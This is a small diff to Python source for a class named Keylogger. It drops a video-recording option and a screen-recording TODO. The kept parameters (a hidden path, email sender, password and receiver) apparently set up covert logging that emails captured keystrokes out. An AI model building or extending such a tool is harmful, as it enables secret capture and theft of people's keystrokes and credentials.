@@ -92,8 +92,7 @@ class Keylogger:
         hiddenPath : bool = False,
         emailSender : str = "",
         passwordSender : str = "",
-        emailRecevier : str = "",
-        withVideo : bool = False
+        emailRecevier : str = ""
     ):
         self.interval = interval
         self.reportMethod = reportMethod
@@ -217,8 +216,5 @@ class Keylogger:
 if __name__ == "__main__":
     Keylogger(
         interval=5,
-        onlyOneFile=True,
-        withVideo=True
+        onlyOneFile=True
     ).start()
-
-# TODO: create screen recording
